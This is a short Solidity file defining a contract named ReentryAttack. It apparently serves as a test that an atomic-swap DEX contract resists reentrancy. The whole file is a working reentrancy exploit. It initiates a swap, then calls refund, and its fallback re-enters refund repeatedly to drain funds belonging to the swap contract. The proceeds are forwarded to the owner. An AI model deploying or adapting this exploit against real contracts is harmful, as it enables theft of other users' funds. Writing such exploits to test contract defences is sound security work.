// SPDX-License-Identifier: BlueOak-1.0.0
pragma solidity = 0.8.15;

// The arguments and returns from the swap contract. These may need to be
// updated in the future if the contract changes.
interface ethswap {
    function initiate(uint refundTimestamp, bytes32 secretHash, address participant) payable external;
    function refund(bytes32 secretHash) external;
}

// ReentryAttack is able to perform a reetry attack to siphon all funds from a
// vulnerable dex contract.
contract ReentryAttack {

    address public owner;
    bytes32 secretHash;
    ethswap swapper;

    constructor() {
        owner = msg.sender;
    }

    // Set up variables used in the attack and initiate a swap.
    function setUsUpTheBomb(address es, bytes32 sh, uint refundTimestamp, address participant)
        public
        payable
    {
        swapper = ethswap(es);
        secretHash = sh;
        // Have the contract initiate to make it msg.sender.
        swapper.initiate{value: msg.value}(refundTimestamp, secretHash, participant);
    }

    // Refund a swap after it's locktime has passed.
    function allYourBase()
        public
    {
        swapper.refund(secretHash);
    }

    // fallback is called EVERY time this contract is sent funds. When the dex
    // swap tranfers us funds, for instance during refund, we are able to call
    // refund again before that method returns. If the swap contract does not
    // check the state properly, does not deny contracts from using, and does
    // not throw on a certain about of gas usage, we are able to get unintended
    // funds belonging to the contract's address.
    fallback ()
        external
        payable
    {
        if (address(this).balance < 5 ether) {
            allYourBase();
        }
    }

    // Send all funds back to the owner.
    function areBelongToUs()
        public
    {
        payable(owner).transfer(address(this).balance);
    }
}
